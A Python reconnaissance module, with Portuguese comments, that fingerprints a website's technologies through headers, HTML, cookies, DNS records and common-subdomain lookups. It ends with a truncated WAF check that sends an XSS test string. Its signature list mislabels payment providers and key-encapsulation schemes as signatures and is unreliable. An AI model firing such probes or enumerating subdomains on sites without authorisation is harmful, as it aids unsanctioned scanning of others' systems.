                'prestashop_signature': {'name': 'PrestaShop Signature', 'category': 'security_technologies'},
                'opencart_signature': {'name': 'OpenCart Signature', 'category': 'security_technologies'},
                'bigcommerce_signature': {'name': 'BigCommerce Signature', 'category': 'security_technologies'},
                'square_signature': {'name': 'Square Signature', 'category': 'security_technologies'},
                'braintree_signature': {'name': 'Braintree Signature', 'category': 'security_technologies'},
                'authorize_net_signature': {'name': 'Authorize.Net Signature', 'category': 'security_technologies'},
                'sage_pay_signature': {'name': 'Sage Pay Signature', 'category': 'security_technologies'},
                'worldpay_signature': {'name': 'Worldpay Signature', 'category': 'security_technologies'},
                'adyen_signature': {'name': 'Adyen Signature', 'category': 'security_technologies'},
                'mollie_signature': {'name': 'Mollie Signature', 'category': 'security_technologies'},
                'klarna_signature': {'name': 'Klarna Signature', 'category': 'security_technologies'},
                'afterpay_signature': {'name': 'Afterpay Signature', 'category': 'security_technologies'},
                'zip_signature': {'name': 'Zip Signature', 'category': 'security_technologies'},
                'sezzle_signature': {'name': 'Sezzle Signature', 'category': 'security_technologies'},
                'affirm_signature': {'name': 'Affirm Signature', 'category': 'security_technologies'},
                'quadpay_signature': {'name': 'Quadpay Signature', 'category': 'security_technologies'},
                'laybuy_signature': {'name': 'Laybuy Signature', 'category': 'security_technologies'},
                'humm_signature': {'name': 'Humm Signature', 'category': 'security_technologies'},
                'openpay_signature': {'name': 'Openpay Signature', 'category': 'security_technologies'},
                'splitit_signature': {'name': 'Splitit Signature', 'category': 'security_technologies'},
                'partial_signature': {'name': 'Partial Signature', 'category': 'security_technologies'},
                'bundled_signature': {'name': 'Bundled Signature', 'category': 'security_technologies'},
                'composite_signature': {'name': 'Composite Signature', 'category': 'security_technologies'},
                'aggregate_signature': {'name': 'Aggregate Signature', 'category': 'security_technologies'},
                'threshold_signature': {'name': 'Threshold Signature', 'category': 'security_technologies'},
                'multi_signature': {'name': 'Multi-Signature', 'category': 'security_technologies'},
                'ring_signature': {'name': 'Ring Signature', 'category': 'security_technologies'},
                'blind_signature': {'name': 'Blind Signature', 'category': 'security_technologies'},
                'group_signature': {'name': 'Group Signature', 'category': 'security_technologies'},
                'identity_based_signature': {'name': 'Identity-Based Signature', 'category': 'security_technologies'},
                'certificate_less_signature': {'name': 'Certificate-Less Signature', 'category': 'security_technologies'},
                'self_certified_signature': {'name': 'Self-Certified Signature', 'category': 'security_technologies'},
                'certificateless_signature': {'name': 'Certificateless Signature', 'category': 'security_technologies'},
                'pairing_based_signature': {'name': 'Pairing-Based Signature', 'category': 'security_technologies'},
                'lattice_based_signature': {'name': 'Lattice-Based Signature', 'category': 'security_technologies'},
                'code_based_signature': {'name': 'Code-Based Signature', 'category': 'security_technologies'},
                'hash_based_signature': {'name': 'Hash-Based Signature', 'category': 'security_technologies'},
                'quantum_resistant_signature': {'name': 'Quantum-Resistant Signature', 'category': 'security_technologies'},
                'post_quantum_signature': {'name': 'Post-Quantum Signature', 'category': 'security_technologies'},
                'dilithium_signature': {'name': 'Dilithium Signature', 'category': 'security_technologies'},
                'falcon_signature': {'name': 'Falcon Signature', 'category': 'security_technologies'},
                'sphincs_signature': {'name': 'SPHINCS+ Signature', 'category': 'security_technologies'},
                'picnic_signature': {'name': 'Picnic Signature', 'category': 'security_technologies'},
                'rainbow_signature': {'name': 'Rainbow Signature', 'category': 'security_technologies'},
                'gemss_signature': {'name': 'GeMSS Signature', 'category': 'security_technologies'},
                'luov_signature': {'name': 'LUOV Signature', 'category': 'security_technologies'},
                'mqdss_signature': {'name': 'MQDSS Signature', 'category': 'security_technologies'},
                'gravity_signature': {'name': 'Gravity-SPHINCS Signature', 'category': 'security_technologies'},
                'sike_signature': {'name': 'SIKE Signature', 'category': 'security_technologies'},
                'bike_signature': {'name': 'BIKE Signature', 'category': 'security_technologies'},
                'hqc_signature': {'name': 'HQC Signature', 'category': 'security_technologies'},
                'classic_mceliece_signature': {'name': 'Classic McEliece Signature', 'category': 'security_technologies'},
                'ntru_signature': {'name': 'NTRU Signature', 'category': 'security_technologies'},
                'saber_signature': {'name': 'Saber Signature', 'category': 'security_technologies'},
                'frodo_signature': {'name': 'FrodoKEM Signature', 'category': 'security_technologies'},
                'newhope_signature': {'name': 'NewHope Signature', 'category': 'security_technologies'},
                'kyber_signature': {'name': 'Kyber Signature', 'category': 'security_technologies'},
                'lac_signature': {'name': 'LAC Signature', 'category': 'security_technologies'},
                'round5_signature': {'name': 'Round5 Signature', 'category': 'security_technologies'},
                'rollo_signature': {'name': 'ROLLO Signature', 'category': 'security_technologies'},
                'rqc_signature': {'name': 'RQC Signature', 'category': 'security_technologies'},
                'three_bears_signature': {'name': 'Three Bears Signature', 'category': 'security_technologies'},
                'titanium_signature': {'name': 'Titanium Signature', 'category': 'security_technologies'},
                'emblem_signature': {'name': 'EMBLEM Signature', 'category': 'security_technologies'},
                'r5nd_signature': {'name': 'R5ND Signature', 'category': 'security_technologies'},
                'mersenne_signature': {'name': 'Mersenne Signature', 'category': 'security_technologies'},
                'ntru_prime_signature': {'name': 'NTRU Prime Signature', 'category': 'security_technologies'},
                'streamlined_ntru_prime_signature': {'name': 'Streamlined NTRU Prime Signature', 'category': 'security_technologies'},
                'sntrup_signature': {'name': 'sntrup Signature', 'category': 'security_technologies'},
                'ntru_hrss_signature': {'name': 'NTRU-HRSS Signature', 'category': 'security_technologies'},
                'ntru_hps_signature': {'name': 'NTRU-HPS Signature', 'category': 'security_technologies'}
            },

            'javascript_globals': {
                'jQuery': {'name': 'jQuery', 'category': 'javascript_libraries'},
                'React': {'name': 'React', 'category': 'frontend_frameworks'},
                'Vue': {'name': 'Vue.js', 'category': 'frontend_frameworks'},
                'angular': {'name': 'Angular', 'category': 'frontend_frameworks'},
                'Backbone': {'name': 'Backbone.js', 'category': 'frontend_frameworks'},
                'Ember': {'name': 'Ember.js', 'category': 'frontend_frameworks'},
                'ga': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                'gtag': {'name': 'Google Analytics 4', 'category': 'analytics_tools'},
                'fbq': {'name': 'Facebook Pixel', 'category': 'analytics_tools'},
                '_paq': {'name': 'Matomo', 'category': 'analytics_tools'},
                'Shopify': {'name': 'Shopify', 'category': 'cms_platforms'},
                'Drupal': {'name': 'Drupal', 'category': 'cms_platforms'},
                'wp': {'name': 'WordPress', 'category': 'cms_platforms'},
                'Vue': {'name': 'Vue.js', 'category': 'frontend_frameworks'},
                'angular': {'name': 'Angular', 'category': 'frontend_frameworks'},
                'Alpine': {'name': 'Alpine.js', 'category': 'frontend_frameworks'}
            },
            
            'css_patterns': {
                r'\.wp-': {'name': 'WordPress', 'category': 'cms_platforms'},
                r'\.drupal-': {'name': 'Drupal', 'category': 'cms_platforms'},
                r'\.joomla-': {'name': 'Joomla', 'category': 'cms_platforms'},
                r'\.bootstrap-': {'name': 'Bootstrap', 'category': 'css_frameworks'},
                r'\.tailwind-': {'name': 'Tailwind CSS', 'category': 'css_frameworks'},
                r'\.mui-': {'name': 'Material-UI', 'category': 'css_frameworks'},
                r'\.ant-': {'name': 'Ant Design', 'category': 'css_frameworks'},
                r'\.tailwind-': {'name': 'Tailwind CSS', 'category': 'css_frameworks'},
                r'\.Mui-': {'name': 'Material-UI', 'category': 'css_frameworks'}
            }
        }
    
    def detect_all(self, verbose=False):
        """Executa detecção completa de tecnologias."""
        if verbose:
            console.print("-" * 60)
            console.print(f"[*] Analisando: [bold cyan]{self.url}[/bold cyan]")
            console.print("-" * 60)
        
        try:
            # Faz requisição principal
            response = self._make_request(self.url)
            if not response:
                return self.detections
            
            # Análises sequenciais
            if verbose:
                console.print("[*] Analisando headers HTTP...")
            self._analyze_headers(response.headers, verbose)
            
            if verbose:
                console.print("[*] Analisando HTML e meta tags...")
            soup = BeautifulSoup(response.content, 'html.parser')
            self._analyze_html(soup, verbose)
            
            if verbose:
                console.print("[*] Analisando JavaScript e CSS...")
            self._analyze_scripts_and_styles(soup, verbose)
            
            if verbose:
                console.print("[*] Analisando cookies...")
            self._analyze_cookies(response.cookies, verbose)
            
            if verbose:
                console.print("[*] Detectando serviços de CDN e cloud...")
            self._detect_cdn_and_cloud(response, verbose)
            
            if verbose:
                console.print("[*] Analisando tecnologias de segurança...")
            self._detect_security_technologies(response, verbose)
            
            if verbose:
                console.print("[*] Analisando DNS e subdomínios...")
            self._analyze_dns_and_subdomains(verbose)
            
            # Detecção passiva adicional
            self._passive_fingerprinting(response, verbose)
            
            if verbose:
                self._display_results()
                
        except Exception as e:
            if verbose:
                console.print(f"[bold red][!] Erro durante detecção: {e}[/bold red]")
        
        return self.detections
    
    def _make_request(self, url):
        """Faz requisição HTTP com retry logic."""
        for attempt in range(self.retries):
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
                return response
            except requests.RequestException as e:
                if attempt == self.retries - 1:
                    console.print(f"[bold red][!] Falha ao conectar após {self.retries} tentativas: {e}[/bold red]")
                    return None
                time.sleep(1)
        return None
    
    def _analyze_headers(self, headers, verbose=False):
        """Analisa headers HTTP para detecção de tecnologias."""
        for header_name, header_patterns in self.tech_database['headers'].items():
            if header_name.lower() in [h.lower() for h in headers.keys()]:
                header_value = headers.get(header_name, '').lower()
                
                for pattern, tech_info in header_patterns.items():
                    if pattern == '*' or pattern.lower() in header_value:
                        # Detecta versão se disponível
                        version = None
                        if tech_info['version_regex']:
                            version_match = re.search(tech_info['version_regex'], headers.get(header_name, ''), re.IGNORECASE)
                            if version_match:
                                version = version_match.group(1)
                        
                        detection = {
                            'name': tech_info['name'],
                            'version': version,
                            'confidence': 0.9,
                            'method': f'header_{header_name.lower()}',
                            'evidence': f"{header_name}: {headers.get(header_name, '')}"
                        }
                        
                        self._add_detection(tech_info['category'], detection)
                        
                        if verbose:
                            version_str = f" v{version}" if version else ""
                            console.print(f"[bold green][+] {tech_info['name']}{version_str}[/bold green] (via {header_name})")
    
    def _analyze_html(self, soup, verbose=False):
        """Analisa conteúdo HTML para detecção de tecnologias."""
        # Meta generator tag
        generator_tag = soup.find('meta', attrs={'name': 'generator'})
        if generator_tag and generator_tag.get('content'):
            content = generator_tag.get('content').lower()
            
            for pattern, tech_info in self.tech_database['html_patterns']['generator'].items():
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    version = match.group(1) if match.groups() else None
                    
                    detection = {
                        'name': tech_info['name'],
                        'version': version,
                        'confidence': 0.85,
                        'method': 'meta_generator',
                        'evidence': f'<meta name="generator" content="{generator_tag.get("content")}">'
                    }
                    
                    self._add_detection(tech_info['category'], detection)
                    
                    if verbose:
                        version_str = f" v{version}" if version else ""
                        console.print(f"[bold green][+] {tech_info['name']}{version_str}[/bold green] (via meta generator)")
        
        # Análise de conteúdo HTML
        html_content = str(soup).lower()
        for pattern, tech_info in self.tech_database['html_patterns']['content_patterns'].items():
            if re.search(pattern, html_content, re.IGNORECASE):
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.7,
                    'method': 'html_content',
                    'evidence': f'Pattern: {pattern}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via HTML pattern)")
        
        # Análise de URLs nos links e scripts
        all_urls = []
        for tag in soup.find_all(['script', 'link', 'img', 'a']):
            url = tag.get('src') or tag.get('href') or ''
            if url:
                all_urls.append(url.lower())
        
        for url in all_urls:
            for pattern, tech_info in self.tech_database['html_patterns']['url_patterns'].items():
                match = re.search(pattern, url, re.IGNORECASE)
                if match:
                    version = None
                    if 'version_regex' in tech_info and tech_info['version_regex']:
                        version_match = re.search(tech_info['version_regex'], url, re.IGNORECASE)
                        if version_match:
                            version = version_match.group(1) if version_match.groups() else None

                    detection = {
                        'name': tech_info['name'],
                        'version': version,
                        'confidence': 0.8,
                        'method': 'url_pattern',
                        'evidence': f'URL: {url}'
                    }
                    
                    self._add_detection(tech_info['category'], detection)
                    
                    if verbose:
                        version_str = f" v{version}" if version else ""
                        console.print(f"[bold green][+] {tech_info['name']}{version_str}[/bold green] (via URL pattern)")
    
    def _analyze_scripts_and_styles(self, soup, verbose=False):
        """Analisa scripts e estilos para detecção de tecnologias."""
        # Análise de scripts
        for script in soup.find_all('script'):
            src = script.get('src', '').lower()
            content = script.string or ''
            
            # Análise de src
            if src:
                for pattern, tech_info in self.tech_database['html_patterns']['script_src'].items():
                    match = re.search(pattern, src, re.IGNORECASE)
                    if match:
                        version = match.group(1) if match.groups() else None
                        
                        detection = {
                            'name': tech_info['name'],
                            'version': version,
                            'confidence': 0.8,
                            'method': 'script_src',
                            'evidence': f'Script src: {src}'
                        }
                        
                        self._add_detection(tech_info['category'], detection)
                        
                        if verbose:
                            version_str = f" v{version}" if version else ""
                            console.print(f"[bold green][+] {tech_info['name']}{version_str}[/bold green] (via script src)")
            
            # Análise de conteúdo JavaScript
            if content:
                for js_global, tech_info in self.tech_database['javascript_globals'].items():
                    if re.search(rf'\b{re.escape(js_global)}\b', content, re.IGNORECASE):
                        detection = {
                            'name': tech_info['name'],
                            'version': None,
                            'confidence': 0.6,
                            'method': 'javascript_global',
                            'evidence': f'JS Global: {js_global}'
                        }
                        
                        self._add_detection(tech_info['category'], detection)
                        
                        if verbose:
                            console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via JS global)")
        
        # Análise de CSS
        for style in soup.find_all(['link', 'style']):
            href = style.get('href', '').lower()
            content = style.string or ''
            
            css_content = href + ' ' + content
            for pattern, tech_info in self.tech_database['css_patterns'].items():
                if re.search(pattern, css_content, re.IGNORECASE):
                    detection = {
                        'name': tech_info['name'],
                        'version': None,
                        'confidence': 0.6,
                        'method': 'css_pattern',
                        'evidence': f'CSS pattern: {pattern}'
                    }
                    
                    self._add_detection(tech_info['category'], detection)
                    
                    if verbose:
                        console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via CSS pattern)")
    
    def _analyze_cookies(self, cookies, verbose=False):
        """Analisa cookies para detecção de tecnologias."""
        for cookie_name, tech_info in self.tech_database['cookies'].items():
            if cookie_name in cookies:
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.8,
                    'method': 'cookie',
                    'evidence': f'Cookie: {cookie_name}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via cookie)")
    
    def _detect_cdn_and_cloud(self, response, verbose=False):
        """Detecta serviços de CDN e cloud."""
        headers = response.headers
        
        # Cloudflare
        if any(h.lower().startswith('cf-') for h in headers.keys()):
            detection = {
                'name': 'Cloudflare',
                'version': None,
                'confidence': 0.95,
                'method': 'cf_headers',
                'evidence': 'CF-* headers presente'
            }
            self._add_detection('cdn_services', detection)
            
            if verbose:
                console.print(f"[bold green][+] Cloudflare[/bold green] (via CF headers)")
        
        # Amazon CloudFront
        if 'x-amz-cf-id' in headers:
            detection = {
                'name': 'Amazon CloudFront',
                'version': None,
                'confidence': 0.95,
                'method': 'aws_headers',
                'evidence': 'X-Amz-Cf-Id header'
            }
            self._add_detection('cdn_services', detection)
            
            if verbose:
                console.print(f"[bold green][+] Amazon CloudFront[/bold green] (via AWS headers)")
        
        # Akamai
        if any('akamai' in h.lower() for h in headers.values()):
            detection = {
                'name': 'Akamai',
                'version': None,
                'confidence': 0.9,
                'method': 'akamai_headers',
                'evidence': 'Akamai in headers'
            }
            self._add_detection('cdn_services', detection)
            
            if verbose:
                console.print(f"[bold green][+] Akamai[/bold green] (via headers)")
    
    def _detect_security_technologies(self, response, verbose=False):
        """Detecta tecnologias de segurança."""
        headers = response.headers
        
        # WAF Detection
        waf_indicators = {
            'cloudflare': 'Cloudflare WAF',
            'incapsula': 'Incapsula WAF',
            'sucuri': 'Sucuri WAF',
            'modsecurity': 'ModSecurity',
            'akamai': 'Akamai WAF'
        }
        
        for indicator, waf_name in waf_indicators.items():
            if any(indicator in str(v).lower() for v in headers.values()):
                detection = {
                    'name': waf_name,
                    'version': None,
                    'confidence': 0.8,
                    'method': 'waf_headers',
                    'evidence': f'{indicator} in headers'
                }
                self._add_detection('security_technologies', detection)
                
                if verbose:
                    console.print(f"[bold green][+] {waf_name}[/bold green] (via headers)")
        
        # Security Headers
        security_headers = {
            'content-security-policy': 'Content Security Policy',
            'strict-transport-security': 'HTTP Strict Transport Security',
            'x-frame-options': 'X-Frame-Options Protection',
            'x-content-type-options': 'X-Content-Type-Options',
            'x-xss-protection': 'X-XSS-Protection'
        }
        
        for header, protection_name in security_headers.items():
            if header in [h.lower() for h in headers.keys()]:
                detection = {
                    'name': protection_name,
                    'version': None,
                    'confidence': 0.9,
                    'method': 'security_header',
                    'evidence': f'{header} header present'
                }
                self._add_detection('security_technologies', detection)
    
    def _passive_fingerprinting(self, response, verbose=False):
        """Fingerprinting passivo baseado em características da resposta."""
        # Análise de timing (placeholder para implementação futura)
        # Análise de tamanho de resposta
        # Análise de padrões de erro
        pass
    
    def _add_detection(self, category, detection):
        """Adiciona detecção evitando duplicatas."""
        # Verifica se já existe detecção similar
        for existing in self.detections[category]:
            if existing['name'] == detection['name']:
                # Atualiza se confidence for maior
                if detection['confidence'] > existing['confidence']:
                    existing.update(detection)
                return
        
        # Adiciona nova detecção
        self.detections[category].append(detection)
    
    def _display_results(self):
        """Exibe resultados em formato tabular."""
        console.print("-" * 60)
        
        # Conta total de tecnologias detectadas
        total_detected = sum(len(techs) for techs in self.detections.values())
        
        if total_detected == 0:
            console.print("[bold yellow][-] Nenhuma tecnologia específica foi detectada.[/bold yellow]")
            console.print("-" * 60)
            return
        
        # Tabela principal
        table = Table(title=f"Tecnologias Detectadas - {self.url}")
        table.add_column("Categoria", style="cyan", width=20)
        table.add_column("Tecnologia", style="magenta", width=25)
        table.add_column("Versão", style="yellow", width=12)
        table.add_column("Confiança", justify="center", style="green", width=10)
        table.add_column("Método", style="dim", width=15)
        
        category_names = {
            'web_servers': 'Servidores Web',
            'frontend_frameworks': 'Frameworks Frontend',
            'backend_technologies': 'Tecnologias Backend',
            'cms_platforms': 'CMS / Plataformas',
            'javascript_libraries': 'Bibliotecas JavaScript',
            'css_frameworks': 'Frameworks CSS',
            'cdn_services': 'Serviços CDN',
            'security_technologies': 'Tecnologias Segurança',
            'analytics_tools': 'Ferramentas Analytics',
            'development_tools': 'Ferramentas Desenvolvimento',
            'databases': 'Bancos de Dados',
            'cloud_services': 'Serviços Cloud'
        }
        
        for category, techs in self.detections.items():
            if techs:
                category_display = category_names.get(category, category.replace('_', ' ').title())
                
                for i, tech in enumerate(sorted(techs, key=lambda x: x['confidence'], reverse=True)):
                    version = tech['version'] or 'N/A'
                    confidence = f"{tech['confidence']:.0%}"
                    method = tech['method'].replace('_', ' ').title()
                    
                    # Primeira linha da categoria
                    if i == 0:
                        table.add_row(category_display, tech['name'], version, confidence, method)
                    else:
                        table.add_row("", tech['name'], version, confidence, method)
        
        console.print(table)
        
        # Estatísticas
        console.print(f"\n[*] Total de tecnologias detectadas: [bold cyan]{total_detected}[/bold cyan]")
        
        # Top categories
        top_categories = sorted(
            [(cat, len(techs)) for cat, techs in self.detections.items() if techs],
            key=lambda x: x[1], reverse=True
        )[:3]
        
        if top_categories:
            console.print("[*] Principais categorias:")
            for category, count in top_categories:
                display_name = category_names.get(category, category.replace('_', ' ').title())
                console.print(f"    • {display_name}: {count} tecnologia(s)")
        
        console.print("-" * 60)
    
    def export_results(self, format_type='json'):
        """Exporta resultados em diferentes formatos."""
        if format_type == 'json':
            return json.dumps(self.detections, indent=2, default=str)
        elif format_type == 'xml':
            return self._generate_xml()
        else:
            return self.detections
    
    def _generate_xml(self):
        """Gera output em formato XML."""
        xml_lines = ['<?xml version="1.0" encoding="UTF-8"?>']
        xml_lines.append('<technology_detection>')
        xml_lines.append(f'  <target>{self.url}</target>')
        
        for category, techs in self.detections.items():
            if techs:
                xml_lines.append(f'  <category name="{category}">')
                for tech in techs:
                    xml_lines.append('    <technology>')
                    xml_lines.append(f'      <name>{tech["name"]}</name>')
                    xml_lines.append(f'      <version>{tech["version"] or "unknown"}</version>')
                    xml_lines.append(f'      <confidence>{tech["confidence"]}</confidence>')
                    xml_lines.append(f'      <method>{tech["method"]}</method>')
                    xml_lines.append('    </technology>')
                xml_lines.append('  </category>')
        
        xml_lines.append('</technology_detection>')
        return '\n'.join(xml_lines)
    
    def _analyze_dns_and_subdomains(self, verbose=False):
        """Analisa DNS e subdomínios para detecção de tecnologias."""
        try:
            # Extrai domínio da URL
            domain = urlparse(self.url).netloc
            if ':' in domain:
                domain = domain.split(':')[0]
            
            if verbose:
                console.print(f"[*] Analisando domínio: {domain}")
            
            # Análise de registros DNS
            self._analyze_dns_records(domain, verbose)
            
            # Análise de subdomínios comuns
            self._analyze_common_subdomains(domain, verbose)
            
        except Exception as e:
            if verbose:
                console.print(f"[bold red][!] Erro na análise DNS: {e}[/bold red]")
    
    def _analyze_dns_records(self, domain, verbose=False):
        """Analisa registros DNS específicos para detecção de tecnologias."""
        dns_types = ['CNAME', 'TXT', 'MX', 'NS', 'A', 'AAAA']
        
        for record_type in dns_types:
            try:
                if record_type == 'A':
                    answers = dns.resolver.resolve(domain, 'A')
                    for answer in answers:
                        ip = str(answer)
                        self._check_ip_patterns(ip, verbose)
                        
                elif record_type == 'AAAA':
                    try:
                        answers = dns.resolver.resolve(domain, 'AAAA')
                        for answer in answers:
                            ipv6 = str(answer)
                            self._check_ipv6_patterns(ipv6, verbose)
                    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                        pass  # IPv6 não disponível
                        
                elif record_type == 'CNAME':
                    try:
                        answers = dns.resolver.resolve(domain, 'CNAME')
                        for answer in answers:
                            cname = str(answer).rstrip('.')
                            self._check_cname_patterns(cname, verbose)
                    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                        pass  # Não é um CNAME
                        
                elif record_type == 'TXT':
                    try:
                        answers = dns.resolver.resolve(domain, 'TXT')
                        for answer in answers:
                            txt_record = str(answer).strip('"')
                            self._check_txt_patterns(txt_record, verbose)
                    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                        pass
                        
                elif record_type == 'MX':
                    try:
                        answers = dns.resolver.resolve(domain, 'MX')
                        for answer in answers:
                            mx_record = str(answer.exchange).rstrip('.')
                            self._check_mx_patterns(mx_record, verbose)
                    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                        pass
                        
                elif record_type == 'NS':
                    try:
                        answers = dns.resolver.resolve(domain, 'NS')
                        for answer in answers:
                            ns_record = str(answer).rstrip('.')
                            self._check_ns_patterns(ns_record, verbose)
                    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                        pass
                        
            except Exception as e:
                if verbose:
                    console.print(f"[bold red][!] Erro ao consultar registro {record_type}: {e}[/bold red]")
    
    def _check_ip_patterns(self, ip, verbose=False):
        """Verifica padrões de IP para detecção de CDN/Cloud."""
        for ip_pattern, tech_info in self.tech_database['dns_records']['A'].items():
            if ip.startswith(ip_pattern):
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.85,
                    'method': 'dns_a_record',
                    'evidence': f'IP: {ip}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via IP A record)")
    
    def _check_ipv6_patterns(self, ipv6, verbose=False):
        """Verifica padrões de IPv6 para detecção de CDN/Cloud."""
        for ipv6_pattern, tech_info in self.tech_database['dns_records']['AAAA'].items():
            if ipv6.startswith(ipv6_pattern):
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.85,
                    'method': 'dns_aaaa_record',
                    'evidence': f'IPv6: {ipv6}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via IPv6 AAAA record)")
    
    def _check_cname_patterns(self, cname, verbose=False):
        """Verifica padrões de CNAME para detecção de serviços."""
        for cname_pattern, tech_info in self.tech_database['dns_records']['CNAME'].items():
            if cname_pattern in cname.lower():
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.9,
                    'method': 'dns_cname_record',
                    'evidence': f'CNAME: {cname}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via CNAME record)")
    
    def _check_txt_patterns(self, txt_record, verbose=False):
        """Verifica padrões de TXT para detecção de serviços."""
        for txt_pattern, tech_info in self.tech_database['dns_records']['TXT'].items():
            if txt_pattern.lower() in txt_record.lower():
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.8,
                    'method': 'dns_txt_record',
                    'evidence': f'TXT: {txt_record[:100]}...' if len(txt_record) > 100 else f'TXT: {txt_record}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via TXT record)")
    
    def _check_mx_patterns(self, mx_record, verbose=False):
        """Verifica padrões de MX para detecção de provedores de email."""
        for mx_pattern, tech_info in self.tech_database['dns_records']['MX'].items():
            if mx_pattern.lower() in mx_record.lower():
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.9,
                    'method': 'dns_mx_record',
                    'evidence': f'MX: {mx_record}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via MX record)")
    
    def _check_ns_patterns(self, ns_record, verbose=False):
        """Verifica padrões de NS para detecção de provedores DNS."""
        for ns_pattern, tech_info in self.tech_database['dns_records']['NS'].items():
            if ns_pattern.lower() in ns_record.lower():
                detection = {
                    'name': tech_info['name'],
                    'version': None,
                    'confidence': 0.85,
                    'method': 'dns_ns_record',
                    'evidence': f'NS: {ns_record}'
                }
                
                self._add_detection(tech_info['category'], detection)
                
                if verbose:
                    console.print(f"[bold green][+] {tech_info['name']}[/bold green] (via NS record)")
    
    def _analyze_common_subdomains(self, domain, verbose=False):
        """Analisa subdomínios comuns para detecção adicional de tecnologias."""
        common_subdomains = [
            'www', 'api', 'app', 'cdn', 'mail', 'ftp', 'admin', 'blog', 'shop',
            'dev', 'test', 'staging', 'demo', 'support', 'help', 'docs', 'portal',
            'secure', 'login', 'account', 'dashboard', 'panel', 'cpanel', 'webmail',
            'm', 'mobile', 'static', 'assets', 'media', 'images', 'files', 'download'
        ]
        
        detected_subdomains = []
        
        for subdomain in common_subdomains:
            try:
                subdomain_url = f"{subdomain}.{domain}"
                # Tenta resolver o subdomínio
                answers = dns.resolver.resolve(subdomain_url, 'A')
                detected_subdomains.append(subdomain_url)
                
                # Analisa CNAME do subdomínio se existir
                try:
                    cname_answers = dns.resolver.resolve(subdomain_url, 'CNAME')
                    for cname_answer in cname_answers:
                        cname = str(cname_answer).rstrip('.')
                        self._check_cname_patterns(cname, verbose)
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                    pass
                    
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, Exception):
                pass  # Subdomínio não existe ou erro
        
        if detected_subdomains and verbose:
            console.print(f"[*] Subdomínios detectados: {len(detected_subdomains)}")
            for sub in detected_subdomains[:10]:  # Mostra apenas os primeiros 10
                console.print(f"    • {sub}")
            if len(detected_subdomains) > 10:
                console.print(f"    • ... e mais {len(detected_subdomains) - 10} subdomínios")

def detect_technologies(url, return_findings=False, verbose=False, output_format='table'):
    """Interface para detecção avançada de tecnologias."""
    detector = AdvancedTechnologyDetector(url)
    results = detector.detect_all(verbose=verbose if not return_findings else False)
    
    if return_findings:
        # Converte para formato legacy se necessário
        if output_format == 'legacy':
            legacy_format = {
                "Servidor Web": set(),
                "CMS / Frameworks": set(),
                "Linguagem de Backend": set(),
                "Bibliotecas JavaScript": set(),
                "Ferramentas de Análise": set(),
                "Base de Dados": set()
            }
            
            # Mapeia resultados para formato legacy
            category_mapping = {
                'web_servers': 'Servidor Web',
                'cms_platforms': 'CMS / Frameworks',
                'backend_technologies': 'Linguagem de Backend',
                'javascript_libraries': 'Bibliotecas JavaScript',
                'analytics_tools': 'Ferramentas de Análise',
                'databases': 'Base de Dados'
            }
            
            for new_cat, old_cat in category_mapping.items():
                for tech in results.get(new_cat, []):
                    version_str = f" {tech['version']}" if tech['version'] else ""
                    legacy_format[old_cat].add(f"{tech['name']}{version_str}")
            
            return legacy_format
        else:
            return results
    
    # Para output direto
    if output_format == 'json':
        print(detector.export_results('json'))
    elif output_format == 'xml':
        print(detector.export_results('xml'))
    else:
        # Já foi exibido em detector.detect_all()
        pass
    
    return results

# --- MÓDULO 12: DETECÇÃO DE WAF ---

def detect_waf(url):
    """Tenta detectar a presença de um Web Application Firewall (WAF)."""
    console.print("-" * 60)
    console.print(f"[*] Verificando a presença de WAF em: [bold cyan]{url}[/bold cyan]")
    console.print("-" * 60)

    malicious_payload = "?id=<script>alert('XSS')</script>"
    test_url = urljoin(url, malicious_payload)
    waf_signatures = {
        "Cloudflare": {"server": "cloudflare"}, "Sucuri": {"server": "Sucuri/Cloudproxy"},
        "Akamai": {"server": "AkamaiGHost"}, "Incapsula": {"cookie": "incap_ses_"},
        "Wordfence": {"body": "blocked by Wordfence"},
    }

    try:
        with console.status("[bold green]Enviando requisições para detectar WAF...[/bold green]"):
            normal_response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
            waf_response = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)

        # 1. Verifica por cabeçalhos de servidor
        for waf, sig in waf_signatures.items():
            if "server" in sig and sig["server"].lower() in waf_response.headers.get("Server", "").lower():
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (pelo cabeçalho 'Server')")
                return

